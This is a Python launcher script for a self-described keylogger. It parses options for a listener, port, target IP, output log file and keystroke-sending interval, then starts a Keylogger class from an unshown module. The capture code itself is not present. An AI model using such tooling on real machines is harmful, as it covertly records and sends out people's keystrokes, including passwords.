import argparse
import textwrap
import sys
sys.path.insert(0, './modules')
from modules import logger

# Arg parse
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='CCSO Keylogger', formatter_class=argparse.RawDescriptionHelpFormatter, epilog=textwrap.dedent('''Example:
        Creating a listener: sudo python logger.py -l
        Creating a client to log: sudo python logger.py
    '''))
    parser.add_argument('-l', '--listen', action='store_true', help='listen')
    parser.add_argument('-p', '--port', type=int, default=9001, help='specified port')
    parser.add_argument('-t', '--target', default='0.0.0.0', help='Specified IP, default is all interfaces')
    parser.add_argument('-o', '--outfile', default='keys.log', help='Output file')
    parser.add_argument('-i', '--interval', type=int, default=60, help='Interval to send keystrokes')
    parser.add_argument('-oF', '--format', default='txt', help='Specify the format of the output logs')

    args = parser.parse_args()

    kl = logger.Keylogger(args)
    kl.start()

